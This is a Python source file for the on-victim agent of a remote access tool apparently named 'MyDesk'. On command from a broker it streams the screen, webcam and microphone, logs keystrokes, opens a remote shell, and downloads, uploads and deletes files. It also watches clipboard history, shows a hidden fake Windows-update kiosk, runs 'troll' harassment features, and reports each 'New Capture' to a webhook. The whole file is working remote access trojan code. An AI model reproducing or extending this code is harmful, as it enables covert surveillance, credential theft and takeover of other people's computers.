import sys
import os
import asyncio
import websockets
import uuid
import json
import subprocess
import urllib.request
import platform
import base64
import threading
import argparse

# FIX: Windows specific event loop policy to prevent "Task was destroyed but it is pending" errors
# and improve stability with subprocesses/pipes.
if sys.platform == 'win32':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

# Add parent directory to path for source execution
if not getattr(sys, 'frozen', False):
    sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

# Handle imports for both source (package) and frozen (direct) execution
try:
    # Try importing from core package first
    from core import protocol
    from core.network import send_msg, recv_msg
except ImportError:
    # Fallback for flattened frozen environment
    import protocol
    from network import send_msg, recv_msg

try:
    # Try importing from target package
    from target.capture import ScreenCapturer
    from target.auditor import KeyAuditor
    from target.webcam import WebcamStreamer
    from target.privacy import PrivacyCurtain
    from target.audio import AudioStreamer
    from target.input_controller import (InputController, parse_mouse_move, 
                                          parse_mouse_click, parse_key_press, parse_scroll)
    from target.shell_handler import ShellHandler
    from target.process_manager import ProcessManager
    from target.file_manager import FileManager
    from target.clipboard_handler import ClipboardHandler
    from target.device_settings import DeviceSettings
    from target.troll_handler import TrollHandler
except ImportError:
    # Fallback for frozen application or direct execution
    
    from capture import ScreenCapturer
    from auditor import KeyAuditor
    from webcam import WebcamStreamer
    from privacy import PrivacyCurtain
    from audio import AudioStreamer
    from input_controller import (InputController, parse_mouse_move, 
                                   parse_mouse_click, parse_key_press, parse_scroll)
    from shell_handler import ShellHandler
    from process_manager import ProcessManager
    from file_manager import FileManager
    from clipboard_handler import ClipboardHandler
    from device_settings import DeviceSettings
    from troll_handler import TrollHandler

# CONFIG
HARDCODED_BROKER = None
HARDCODED_WEBHOOK = None

# DEFAULTS
DEFAULT_BROKER = "ws://localhost:8765"
WEBHOOK_URL = None

# LOAD CONFIG
if HARDCODED_BROKER:
    DEFAULT_BROKER = HARDCODED_BROKER
    WEBHOOK_URL = HARDCODED_WEBHOOK
else:
    CONFIG_FILE = "config.json"
    if getattr(sys, 'frozen', False):
        BASE_DIR = os.path.dirname(sys.executable)
    else:
        BASE_DIR = os.path.dirname(__file__)

    CONFIG_PATH = os.path.join(BASE_DIR, CONFIG_FILE)
    if os.path.exists(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, 'r') as f:
                cfg = json.load(f)
                DEFAULT_BROKER = cfg.get("broker_url", DEFAULT_BROKER)
                WEBHOOK_URL = cfg.get("webhook_url", None)
        except Exception:
            pass

class AsyncAgent:
    def __init__(self, broker_url=DEFAULT_BROKER):
        self.broker_url = broker_url
        self.my_id = str(uuid.getnode()) # Assuming generate_machine_id() is equivalent to this or needs to be defined
        self.ws = None
        self.loop = None
        
        # Components
        self.capturer = ScreenCapturer(quality=50, scale=0.9) # Retain original capturer settings
        self.auditor = KeyAuditor(self.send_key_sync) # Retain original auditor init
        self.webcam = WebcamStreamer(quality=40) # Retain original webcam settings
        self.mic = AudioStreamer()
        self.input_ctrl = InputController()
        # Privacy component
        
        # FIX: Store background tasks to prevent garbage collection (Task destroyed error)
        self.background_tasks = set()
        self.privacy = PrivacyCurtain() # Retain original curtain init
        
        # New Handlers
        self.shell_handler = ShellHandler(
            on_output=self.on_shell_output,
            on_exit=self.on_shell_exit,
            on_cwd=self.on_shell_cwd
        )
        self.process_mgr = ProcessManager()
        self.file_mgr = FileManager()
        self.clipboard_handler = ClipboardHandler(on_change=self.on_clipboard_change)
        self.device_settings = DeviceSettings()
        self.troll_handler = TrollHandler()
        self.direct_ws_clients = set()
        self.direct_url = None
        self.direct_server = None
        self.curtain = self.privacy # Alias for compatibility
        
        # State
        self.streaming = False
        self._stream_task = None 
        self.cam_streaming = False
        self.mic_streaming = False
        
        # Kiosk Process
        self.kiosk_process = None

    def _create_background_task(self, coro):
        """Helper to create fire-and-forget background tasks safely."""
        task = asyncio.create_task(coro)
        self.background_tasks.add(task)
        task.add_done_callback(self.background_tasks.discard)
        return task        
        
    def _send_async(self, opcode, payload=b''):
        """Helper to safely send message from any thread to ALL clients"""
        msg = bytes([opcode]) + payload
        
        # Send to Broker
        if self.ws and self.loop:
            try:
                asyncio.run_coroutine_threadsafe(
                    send_msg(self.ws, msg),
                    self.loop
                )
            except Exception:
                pass

        # Send to Direct Clients
        if self.direct_ws_clients and self.loop:
            for client in list(self.direct_ws_clients):
                fut = asyncio.run_coroutine_threadsafe(
                    send_msg(client, msg),
                    self.loop
                )
                # Cleanup on failure safely on the loop
                def _handle_send_result(f, c=client):
                    try:
                        f.result()
                    except Exception as e:
                        print(f"[-] Send error: {e}")
                        # Schedule removal on loop
                        if self.loop.is_running():
                            self.loop.call_soon_threadsafe(self.direct_ws_clients.discard, c)
                
                fut.add_done_callback(_handle_send_result)

    def on_shell_output(self, text):
        self._send_async(protocol.OP_SHELL_OUTPUT, text.encode('utf-8', errors='replace'))
        
    def on_shell_exit(self, code):
        import struct
        self._send_async(protocol.OP_SHELL_EXIT, struct.pack('<i', code))

    def on_shell_cwd(self, path):
        self._send_async(protocol.OP_SHELL_CWD, path.encode('utf-8', errors='replace'))

    def on_clipboard_change(self, entry):
        """Called when clipboard content changes (from monitoring thread)."""
        try:
            data = json.dumps(entry).encode('utf-8')
            self._send_async(protocol.OP_CLIP_ENTRY, data)
        except Exception as e:
            print(f"[-] Clipboard change send error: {e}")





    async def _fix_headers(self, connection, request):
        """Hook to fix headers from Cloudflare Tunnel (forces Connection: Upgrade)"""
        try:
            # Create mutable copy
            # Attempt to mutate in-place first to preserve type
            headers = getattr(request, 'headers', request)
            
            try:
                # Try direct mutation (works for dict and some mutable mappings)
                if 'Connection' in headers: del headers['Connection']
                if 'Upgrade' in headers: del headers['Upgrade']
                headers['Connection'] = 'Upgrade'
                headers['Upgrade'] = 'websocket'
            except TypeError:
                # If immutable (e.g. websockets.datastructures.Headers), try replacement with dict
                # Note: This changes the type to dict, which might have side effects but usually works for simple servers
                new_headers = dict(headers)
                if 'Connection' in new_headers: del new_headers['Connection']
                if 'Upgrade' in new_headers: del new_headers['Upgrade']
                new_headers['Connection'] = 'Upgrade'
                new_headers['Upgrade'] = 'websocket'
                
                if hasattr(request, 'headers'):
                    try:
                        request.headers = new_headers
                    except Exception as e:
                        print(f"[!] Header Fix Error: {e}")
                
        except Exception as e:
            print(f"[!] Header Fix Validation Warning: {e}")
        return None  # Continue with connection

    async def start_direct_server(self):
        """Starts the internal WebSocket server for Cloudflare Tunnel traffic"""
        try:
            print("[*] Starting Internal Direct Server on port 8765...")
            # Allow all origins for now to simplify
            # Relaxed Ping settings for heavy streaming
            async with websockets.serve(
                self.handle_direct_client, 
                "localhost", 
                8765,
                ping_interval=30,
                ping_timeout=60,
                process_request=self._fix_headers
            ):
                print("[+] Direct Server Listening on 8765")
                await asyncio.Future()  # Run forever
        except Exception as e:
            print(f"[-] Direct Server Error: {e}")

    async def handle_direct_client(self, websocket):
        """Handle incoming connection from Tunnel"""
        # Suppress "InvalidMessage" handshake errors from health checks
        try:
            print("[+] Direct Client Connected!")
            self.direct_ws_clients.add(websocket)
            try:
                async for message in websocket:
                    await self.handle_message(message, websocket)
            except websockets.exceptions.ConnectionClosed:
                pass
            finally:
                print("[-] Direct Client Disconnected")
                self.direct_ws_clients.discard(websocket)
        except websockets.exceptions.InvalidMessage:
            # Common with Cloudflare Tunnel health checks
            self.direct_ws_clients.discard(websocket)
            return
        except Exception as e:
            print(f"[-] Direct Handler Error: {e}")
            self.direct_ws_clients.discard(websocket)

    async def handle_message(self, message, source_ws):
        """Unified message handler for both Broker and Direct connections"""
        try:
            if isinstance(message, bytes):
                # Handle Binary Opcodes (Input, Cam, Mic, Curtain from Viewer)
                if not message: return
                opcode = message[0]
                payload = message[1:]
                
        # === REMOTE INPUT ===
                if opcode == protocol.OP_MOUSE_MOVE:
                    try:
                        x, y = parse_mouse_move(payload)
                        if x is not None:
                            await self.loop.run_in_executor(None, self.input_ctrl.move_mouse, x, y)
                    except Exception as e:
                        print(f"[-] Mouse Move Error: {e}")
                
                elif opcode == protocol.OP_MOUSE_CLICK:
                    try:
                        button, pressed = parse_mouse_click(payload)
                        if button is not None:
                            await self.loop.run_in_executor(None, self.input_ctrl.click_mouse, button, pressed)
                    except Exception as e:
                        print(f"[-] Mouse Click Error: {e}")
                
                elif opcode == protocol.OP_KEY_PRESS:
                    try:
                        key_code, pressed = parse_key_press(payload)
                        if key_code is not None:
                            await self.loop.run_in_executor(None, self.input_ctrl.press_key, key_code, pressed)
                    except Exception as e:
                        print(f"[-] Key Press Error: {e}")
                
                elif opcode == protocol.OP_SCROLL:
                    try:
                        dx, dy = parse_scroll(payload)
                        if dx is not None:
                            await self.loop.run_in_executor(None, self.input_ctrl.scroll, dx, dy)
                    except Exception as e:
                        print(f"[-] Scroll Error: {e}")
                
                elif opcode == protocol.OP_KEY_BUFFER:
                    # Buffered text input
                    try:
                        text = payload.decode('utf-8')
                        await self.loop.run_in_executor(None, self.input_ctrl.type_text, text)
                    except Exception as e:
                        print(f"[-] Buffer Input Error: {e}")

                elif opcode == protocol.OP_CAM_START:
                    if not self.cam_streaming:
                        if self.webcam.start():
                            self.cam_streaming = True
                            self._create_background_task(self.stream_webcam(source_ws))
                        else:
                            # Send error back to viewer
                            print("[!] Webcam failed, notifying viewer...")
                            await send_msg(source_ws, bytes([protocol.OP_ERROR]) + b"CAM:No webcam found")

                elif opcode == protocol.OP_CAM_STOP:
                    self.cam_streaming = False
                    self.webcam.stop()

                elif opcode == protocol.OP_MIC_START:
                    if not self.mic_streaming:
                        if self.mic.start():
                            self.mic_streaming = True
                            self._create_background_task(self.stream_mic(source_ws))
                        else:
                            # Send error back to viewer
                            print("[!] Mic failed, notifying viewer...")
                            await send_msg(source_ws, bytes([protocol.OP_ERROR]) + b"MIC:No microphone found")

                elif opcode == protocol.OP_MIC_STOP:
                    self.mic_streaming = False
                    self.mic.stop()
                
                elif opcode == protocol.OP_CURTAIN_ON:
                    try:
                        mode = payload.decode('utf-8')
                    except Exception:
                        mode = "BLACK"
                        
                    if mode == "FAKE_UPDATE":
                        print("[*] Launching Fake Update Kiosk...")
                        if not self.kiosk_process or self.kiosk_process.poll() is not None:
                            self.kiosk_process = None  # Clean up stale handle
                            # Resolve kiosk script path (support frozen exe)
                            if getattr(sys, 'frozen', False):
                                # PyInstaller: check _MEIPASS first
                                base_path = getattr(sys, '_MEIPASS', os.path.dirname(sys.executable))
                                kiosk_script = os.path.join(base_path, 'kiosk.py')
                            else:
                                kiosk_script = os.path.join(os.path.dirname(__file__), 'kiosk.py')
                            # Validate script exists
                            if not os.path.exists(kiosk_script):
                                print(f"[-] Kiosk script not found: {kiosk_script}")
                            else:
                                # Run with same python, hide console on Windows
                                try:
                                    creation_flags = 0
                                    if os.name == 'nt':
                                        creation_flags = subprocess.CREATE_NO_WINDOW
                                    self.kiosk_process = subprocess.Popen(
                                        [sys.executable, kiosk_script],
                                        creationflags=creation_flags
                                    )
                                except Exception as e:
                                    print(f"[-] Failed to launch kiosk: {e}")
                    else:
                        await self.loop.run_in_executor(None, self.privacy.enable)

                elif opcode == protocol.OP_CURTAIN_OFF:
                    if self.kiosk_process:
                        print("[*] Stopping Kiosk...")
                        self.kiosk_process.terminate()
                        try:
                            self.kiosk_process.wait(timeout=3)
                        except subprocess.TimeoutExpired:
                            print("[!] Kiosk did not terminate, killing...")
                            self.kiosk_process.kill()
                            self.kiosk_process.wait()
                        self.kiosk_process = None
                        
                    await self.loop.run_in_executor(None, self.privacy.disable)

                elif opcode == protocol.OP_SETTINGS:
                    try:
                        import msgpack
                        settings = msgpack.unpackb(payload)
                        self.apply_settings(settings)
                    except:
                        try:
                            settings = json.loads(payload.decode('utf-8'))
                            self.apply_settings(settings)
                        except: pass
                
                # ================================================================
                # Troll
                # ================================================================
                elif opcode == protocol.OP_TROLL_URL:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        url = data.get('url', '')
                        await self.loop.run_in_executor(None, self.troll_handler.open_url, url)
                    except Exception as e:
                        print(f"[-] Troll URL Error: {e}")
                
                elif opcode == protocol.OP_TROLL_SOUND:
                    await self.loop.run_in_executor(None, self.troll_handler.play_sound, payload)
                
                elif opcode == protocol.OP_TROLL_RANDOM_SOUND:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        if data.get('enabled'):
                            interval = data.get('interval_ms', 5000)
                            self.troll_handler.start_random_sounds(interval)
                        else:
                            self.troll_handler.stop_random_sounds()
                    except Exception as e:
                        print(f"[-] Troll Random Sound Error: {e}")
                
                elif opcode == protocol.OP_TROLL_ALERT_LOOP:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        if data.get('enabled'):
                            self.troll_handler.start_alert_loop()
                        else:
                            self.troll_handler.stop_alert_loop()
                    except Exception as e:
                        print(f"[-] Troll Alert Loop Error: {e}")
                
                elif opcode == protocol.OP_TROLL_VOLUME_MAX:
                    await self.loop.run_in_executor(None, self.troll_handler.volume_max_sound)
                
                elif opcode == protocol.OP_TROLL_EARRAPE:
                    await self.loop.run_in_executor(None, self.troll_handler.earrape)
                
                elif opcode == protocol.OP_TROLL_WHISPER:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        if data.get('enabled'):
                            self.troll_handler.start_whisper()
                        else:
                            self.troll_handler.stop_whisper()
                    except Exception as e:
                        print(f"[-] Troll Whisper Error: {e}")
                
                elif opcode == protocol.OP_TROLL_VIDEO:
                    await self.loop.run_in_executor(None, self.troll_handler.play_video, payload)
                
                elif opcode == protocol.OP_TROLL_GHOST_CURSOR:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        if data.get('enabled'):
                            self.troll_handler.start_ghost_cursor()
                        else:
                            self.troll_handler.stop_ghost_cursor()
                    except Exception as e:
                        print(f"[-] Troll Ghost Cursor Error: {e}")
                
                elif opcode == protocol.OP_TROLL_SHUFFLE_ICONS:
                    await self.loop.run_in_executor(None, self.troll_handler.shuffle_desktop_icons)
                
                elif opcode == protocol.OP_TROLL_WALLPAPER:
                    await self.loop.run_in_executor(None, self.troll_handler.set_wallpaper, payload)
                
                elif opcode == protocol.OP_TROLL_OVERLAY:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        overlay_type = data.get('type', 'crack')
                        await self.loop.run_in_executor(None, self.troll_handler.show_overlay, overlay_type)
                    except Exception as e:
                        print(f"[-] Troll Overlay Error: {e}")
                
                elif opcode == protocol.OP_TROLL_STOP:
                    await self.loop.run_in_executor(None, self.troll_handler.stop_all)
                
                # ============================================================================
                # NEW HANDLERS
                # ============================================================================

                # SHELL
                elif opcode == protocol.OP_SHELL_EXEC:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        cmd = data.get('cmd')
                        shell_type = data.get('shell', 'ps')
                        
                        # Start shell if not running or type changed
                        if (not self.shell_handler.running or 
                            self.shell_handler.current_shell != shell_type):
                            
                            # Stop existing if running
                            if self.shell_handler.running:
                                await self.loop.run_in_executor(None, self.shell_handler.stop)
                            
                            # Run in executor to avoid blocking main loop
                            await self.loop.run_in_executor(None, self.shell_handler.start_shell, shell_type)
                            
                        # Write input (enter is handled by handler or client)
                        if cmd:
                            await self.loop.run_in_executor(None, self.shell_handler.write_input, cmd)
                    except Exception as e:
                        print(f"[-] Shell Exec Error: {e}")

                # PROCESS MANAGER
                elif opcode == protocol.OP_PM_LIST:
                    try:
                        procs = await self.loop.run_in_executor(None, self.process_mgr.list_processes)
                        data = self.process_mgr.to_json(procs)
                        self._send_async(protocol.OP_PM_DATA, data)
                    except Exception as e:
                        print(f"[-] PM List Error: {e}")
                
                elif opcode == protocol.OP_PM_KILL:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        pid = data.get('pid')
                        if pid:
                            await self.loop.run_in_executor(None, self.process_mgr.kill_process, pid)
                            # Refresh list after kill
                            procs = await self.loop.run_in_executor(None, self.process_mgr.list_processes)
                            data = self.process_mgr.to_json(procs)
                            self._send_async(protocol.OP_PM_DATA, data)
                    except Exception as e:
                        print(f"[-] PM Kill Error: {e}")

                # FILE MANAGER
                elif opcode == protocol.OP_FM_LIST:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        path = data.get('path', '')
                        # Fix: list_files -> list_dir
                        files = await self.loop.run_in_executor(None, self.file_mgr.list_dir, path)
                        
                        # Fix: Construct correct response structure since list_dir only returns list
                        current_path = path if path else os.path.expanduser("~")
                        resp = json.dumps({'files': files, 'path': current_path}).encode('utf-8')
                        self._send_async(protocol.OP_FM_DATA, resp)
                    except Exception as e:
                        print(f"[-] FM List Error: {e}")

                elif opcode == protocol.OP_FM_DOWNLOAD:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        path = data.get('path')
                        if path:
                            # Use executor to avoid blocking event loop
                            async def read_chunks_async(file_path):
                                queue = asyncio.Queue(maxsize=10) # Bounded
                                
                                def read_worker():
                                    try:
                                        for chunk in self.file_mgr.read_file_chunks(file_path):
                                            future = asyncio.run_coroutine_threadsafe(
                                                queue.put(chunk), self.loop
                                            )
                                            # Wait with timeout to detect dead loop
                                            try:
                                                future.result(timeout=5.0)
                                            except (concurrent.futures.TimeoutError, Exception):
                                                break
                                        
                                        # Signal end
                                        if self.loop.is_running():
                                            asyncio.run_coroutine_threadsafe(
                                                queue.put(None), self.loop
                                            )
                                    except Exception as e:
                                        print(f"[-] FM Read Worker Error: {e}")
                                        if self.loop.is_running():
                                            asyncio.run_coroutine_threadsafe(
                                                queue.put(None), self.loop
                                            )
                                
                                # Start worker thread
                                threading.Thread(target=read_worker, daemon=True).start()
                                
                                # Read from queue
                                while True:
                                    chunk = await queue.get()
                                    if chunk is None:
                                        break
                                    self._send_async(protocol.OP_FM_CHUNK, chunk)
                                
                                # Signal end of stream with empty chunk
                                self._send_async(protocol.OP_FM_CHUNK, b'')
                            
                            await read_chunks_async(path)
                    except Exception as e:
                        print(f"[-] FM Download Error: {e}")

                elif opcode == protocol.OP_FM_UPLOAD:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        path = data.get('path')
                        b64_data = data.get('data')
                        if path and b64_data:
                            file_data = base64.b64decode(b64_data)
                            await self.loop.run_in_executor(None, self.file_mgr.write_file, path, file_data)
                            # Refresh list
                            parent = os.path.dirname(path)
                            # Fix: list_files -> list_dir and manual response construction
                            files = await self.loop.run_in_executor(None, self.file_mgr.list_dir, parent)
                            resp = json.dumps({'files': files, 'path': parent}).encode('utf-8')
                            self._send_async(protocol.OP_FM_DATA, resp)
                    except Exception as e:
                        print(f"[-] FM Upload Error: {e}")

                elif opcode == protocol.OP_FM_DELETE:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        path = data.get('path')
                        if path:
                            # Fix: delete_item -> delete
                            await self.loop.run_in_executor(None, self.file_mgr.delete, path)
                            # Refresh
                            parent = os.path.dirname(path)
                            # Fix: list_files -> list_dir
                            files = await self.loop.run_in_executor(None, self.file_mgr.list_dir, parent)
                            resp = json.dumps({'files': files, 'path': parent}).encode('utf-8')
                            self._send_async(protocol.OP_FM_DATA, resp)
                    except Exception as e:
                        print(f"[-] FM Delete Error: {e}")

                elif opcode == protocol.OP_FM_MKDIR:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        path = data.get('path')
                        if path:
                            # Fix: create_directory -> mkdir
                            await self.loop.run_in_executor(None, self.file_mgr.mkdir, path)
                            # Refresh
                            parent = os.path.dirname(path.rstrip('/\\'))
                            files = await self.loop.run_in_executor(None, self.file_mgr.list_dir,  parent)
                            resp = json.dumps({'files': files, 'path': parent}).encode('utf-8')
                            self._send_async(protocol.OP_FM_DATA, resp)
                    except Exception as e:
                        print(f"[-] FM Mkdir Error: {e}")

                # CLIPBOARD
                elif opcode == protocol.OP_CLIP_GET:
                    try:
                        text = await self.loop.run_in_executor(None, self.clipboard_handler.get_clipboard)
                        if text is None: text = ""
                        self._send_async(protocol.OP_CLIP_DATA, text.encode('utf-8'))
                    except Exception as e:
                        print(f"[-] Clip Get Error: {e}")
                        self._send_async(protocol.OP_CLIP_DATA, b'')

                elif opcode == protocol.OP_CLIP_SET:
                    try:
                        text = payload.decode('utf-8')
                        await self.loop.run_in_executor(None, self.clipboard_handler.set_clipboard, text)
                    except Exception as e:
                        print(f"[-] Clip Set Error: {e}")

                elif opcode == protocol.OP_CLIP_HISTORY_REQ:
                    # Send full clipboard history
                    try:
                        history = self.clipboard_handler.get_history()
                        data = json.dumps(history).encode('utf-8')
                        self._send_async(protocol.OP_CLIP_HISTORY_DATA, data)
                    except Exception as e:
                        print(f"[-] Clip History Error: {e}")

                elif opcode == protocol.OP_CLIP_DELETE:
                    # Delete entry by index
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        index = data.get('index', -1)
                        if index >= 0:
                            self.clipboard_handler.delete_entry(index)
                            # Send updated history
                            history = self.clipboard_handler.get_history()
                            resp = json.dumps(history).encode('utf-8')
                            self._send_async(protocol.OP_CLIP_HISTORY_DATA, resp)
                    except Exception as e:
                        print(f"[-] Clip Delete Error: {e}")

                # DEVICE SETTINGS (Volume, etc)
                # Network settings (WiFi/Ethernet) removed by user request
                
                elif opcode == protocol.OP_SET_VOLUME:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        self.device_settings.set_volume(data['level'])
                    except Exception as e:
                        print(f"[-] Set Volume Error: {e}")

                elif opcode == protocol.OP_SET_MUTE:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        self.device_settings.set_mute(data['muted'])
                    except Exception as e:
                        print(f"[-] Set Mute Error: {e}")

                elif opcode == protocol.OP_SET_BRIGHTNESS:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        self.device_settings.set_brightness(data['level'])
                    except Exception as e:
                        print(f"[-] Set Brightness Error: {e}")

                elif opcode == protocol.OP_SET_TIME:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        self.device_settings.set_time(data['datetime'])
                    except Exception as e:
                        print(f"[-] Set Time Error: {e}")

                elif opcode == protocol.OP_SYNC_TIME:
                    try:
                        await self.loop.run_in_executor(None, self.device_settings.sync_time)
                    except Exception as e:
                        print(f"[-] Sync Time Error: {e}")

                elif opcode == protocol.OP_POWER_ACTION:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        await self.loop.run_in_executor(None, self.device_settings.power_action, data['action'])
                    except Exception as e:
                        print(f"[-] Power Action Error: {e}")

                elif opcode == protocol.OP_GET_SYSINFO:
                    try:
                        # Fix: Run blocking sysinfo in executor
                        info = await self.loop.run_in_executor(None, self.device_settings.get_sysinfo)
                        self._send_async(protocol.OP_SYSINFO_DATA, json.dumps(info).encode('utf-8'))
                    except Exception as e:
                        print(f"[-] SysInfo Error: {e}")

                elif opcode == protocol.OP_DISCONNECT:
                    self.streaming = False
                    self.cam_streaming = False
                    self.mic_streaming = False
                    self.shell_handler.stop()
                
                return 
        except Exception as e:
            print(f"[-] Binary Handler Error: {e}")
            return 
            
        try:
            data = json.loads(message)
            op = data.get('op')
            
            if op == 'hello':
                await send_msg(source_ws, json.dumps({
                     'op': 'hello', 
                     'id': self.my_id,
                     'hostname': platform.node(),
                     'platform': platform.system()
                 }))
            elif op == 'start_stream':
                self.streaming = True
                asyncio.create_task(self.stream_screen(source_ws))
                self.auditor.start()
            elif op == 'stop_stream':
                self.streaming = False
                self.auditor.stop()
            elif op == 'mouse_move':
                if self.input_ctrl: self.input_ctrl.move_mouse(data['x'], data['y'])
            elif op == 'mouse_click':
                if self.input_ctrl: 
                    self.input_ctrl.move_mouse(data['x'], data['y'])
                    self.input_ctrl.click_mouse(data['button'], data['pressed'])
            
        except Exception as e:
            print(f"Error handling message: {e}")

    def announce_identity(self):
        if not WEBHOOK_URL:
            return
        
        msg = (f"**🔔 New Capture!**\n"
               f"**ID:** `{self.my_id}`\n"
               f"**User:** `{platform.node()}`\n"
               f"**OS:** `{platform.system()} {platform.release()}`")
        
        payload = {
            "content": msg,
            "username": "MyDesk Agent"
        }
        
        print("[*] Announcing Identity to webhook")
        try:
            req = urllib.request.Request(WEBHOOK_URL)
            req.add_header('Content-Type', 'application/json')
            req.add_header('User-Agent', 'Mozilla/5.0')
            
            jsondata = json.dumps(payload).encode('utf-8')
            req.add_header('Content-Length', len(jsondata))
            
            urllib.request.urlopen(req, jsondata, timeout=5)
            print("[+] Announcement Sent")
        except Exception as e:
            print(f"[-] Announcement Failed: {e}")

    async def connect_loop(self):
        print("[*] Agent connecting to broker")
        while True:
            try:
                # Optimized connection params for Render (Free Tier)
                async with websockets.connect(
                    self.broker_url,
                    open_timeout=20,     # Longer handshake for slow servers
                    ping_interval=30,    # Relaxed interval
                    ping_timeout=60      # Tolerate congestion
                ) as ws:
                    self.ws = ws
                    print("[+] Connected to Broker!")
                    
                    payload = self.my_id
                    if self.direct_url:
                        payload += f"|{self.direct_url}"
                    
                    await send_msg(ws, bytes([protocol.OP_HELLO]) + payload.encode())

                    # ================================================================
                    # INITIAL DATA PUSH (Refresh on Connect)
                    # ================================================================
                    try:
                        # 1. SysInfo
                        info = await self.loop.run_in_executor(None, self.device_settings.get_sysinfo)
                        self._send_async(protocol.OP_SYSINFO_DATA, json.dumps(info).encode('utf-8'))
                        
                        # 2. Process List
                        procs = await self.loop.run_in_executor(None, self.process_mgr.list_processes)
                        pm_data = self.process_mgr.to_json(procs)
                        self._send_async(protocol.OP_PM_DATA, pm_data)

                        # 3. File List (Home/Root)
                        home = os.path.expanduser("~")
                        files = await self.loop.run_in_executor(None, self.file_mgr.list_dir, home)
                        fm_resp = json.dumps({'files': files, 'path': home}).encode('utf-8')
                        self._send_async(protocol.OP_FM_DATA, fm_resp)
                        
                        print("[+] Initial Data Pushed")
                        
                        # Start clipboard monitoring for real-time updates
                        self.clipboard_handler.start_monitoring()
                        print("[+] Clipboard Monitoring Started")
                    except Exception as e:
                        print(f"[-] Initial Push Partial Error: {e}")

                    await self.handle_messages()
                    
            except Exception as e:
                print(f"[-] Connection Lost: {e}")
                # Clean up all state (non-blocking)
                self.custom_status = None # Reset status
                self.streaming = False
                self.cam_streaming = False
                self.mic_streaming = False
                
                # Stop clipboard monitor if running
                if hasattr(self, 'clipboard_handler'):
                    try:
                         self.clipboard_handler.stop_monitoring()
                    except: pass
                self.shell_handler.stop()
                try:
                    await self.loop.run_in_executor(None, self.auditor.stop)
                except:
                    pass
                self.ws = None
                print("[*] Reconnecting in 3 seconds...")
                await asyncio.sleep(3)  # Faster retry

    async def _cwd_poll_loop(self):
        """Periodically poll CWD from shell handler and start sending updates"""
        while self.ws:
            try:
                if self.shell_handler.running:
                    cwd = await self.loop.run_in_executor(None, self.shell_handler.get_cwd)
                    if cwd:
                        self._send_async(protocol.OP_SHELL_CWD, cwd.encode('utf-8', errors='replace'))
            except Exception:
                pass
            await asyncio.sleep(2.0)

    async def handle_messages(self):
        """Broker Message Loop"""
        # DISABLED: CWD Poller sends stale data (psutil gets process cwd, not shell $pwd)
        # Viewer now parses __CWD__ markers directly from shell output
        # self._create_background_task(self._cwd_poll_loop())
        
        while True:
            msg = await recv_msg(self.ws)
            if not msg:
                break
            await self.handle_message(msg, self.ws)
                
        # CLEANUP ON DISCONNECT
        print("[!] Connection Lost/Reset. Cleaning up...")
        self.streaming = False
        self.cam_streaming = False
        self.mic_streaming = False
        self.shell_handler.stop()
        self.auditor.stop()
        self.webcam.stop()
        self.mic.stop()
    
    def apply_settings(self, settings):
        """Apply capture settings from Viewer"""
        print(f"[*] Applying Settings: {settings}")
        quality = settings.get("quality", 50)
        scale = settings.get("scale", 90) / 100.0
        method = settings.get("method", "mss")
        fmt = settings.get("format", "WEBP")
        
        # Recreate capturer with new settings
        self.capturer = ScreenCapturer(
            quality=quality, 
            scale=scale,
            method=method,
            format=fmt
        )

    async def stream_screen(self, target_ws=None):
        print("[*] Screen Streaming Task Started")
        ws_to_use = target_ws if target_ws else self.ws
        pending_send = None
        try:
            while self.streaming:
                # Skip frame if previous send is still pending
                if pending_send and not pending_send.done():
                    await asyncio.sleep(0.016)
                    continue
                
                start_time = asyncio.get_running_loop().time()
                jpeg = await self.loop.run_in_executor(None, self.capturer.get_frame_bytes)
                # jpeg = None # DISABLED FOR LOCAL TESTING (NO MIRROR)
                if jpeg:
                    header = bytes([protocol.OP_IMG_FRAME])
                    pending_send = self._create_background_task(send_msg(ws_to_use, header + jpeg))
                
                elapsed = asyncio.get_running_loop().time() - start_time
                wait_time = max(0.001, 0.033 - elapsed) # 30 FPS
                await asyncio.sleep(wait_time)
        except (websockets.exceptions.ConnectionClosed, ConnectionError):
            print("[-] Screen Stream: Connection Closed")
        except Exception as e:
            print(f"[-] Screen Stream Error: {e}")
        finally:
            self.streaming = False
            
    async def stream_webcam(self, target_ws=None):
        print("[*] Webcam Streaming Task Started")
        ws_to_use = target_ws if target_ws else self.ws
        try:
            while self.cam_streaming:
                jpeg = await self.loop.run_in_executor(None, self.webcam.get_frame_bytes)
                if jpeg:
                    header = bytes([protocol.OP_CAM_FRAME])
                    await send_msg(ws_to_use, header + jpeg)
                await asyncio.sleep(0.06)
        except (websockets.exceptions.ConnectionClosed, ConnectionError):
            print("[-] Webcam Stream: Connection Closed")
        except Exception as e:
            print(f"[-] Webcam Stream Error: {e}")
        finally:
            self.cam_streaming = False

    async def stream_mic(self, target_ws=None):
        print("[*] Mic Streaming Task Started")
        ws_to_use = target_ws if target_ws else self.ws
        restart_attempts = 0
        MAX_RESTARTS = 3
        failures = 0
        try:
            while self.mic_streaming:
                try:
                    chunk = await self.loop.run_in_executor(None, self.mic.get_chunk)
                    if chunk:
                        failures = 0 # Reset counter on success
                        restart_attempts = 0 # Reset restarts
                        header = bytes([protocol.OP_AUDIO_CHUNK])
                        await send_msg(ws_to_use, header + chunk)
                    else:
                        await asyncio.sleep(0.01)
                except Exception as e:
                    failures += 1
                    print(f"[-] Mic Read Error ({failures}): {e}")
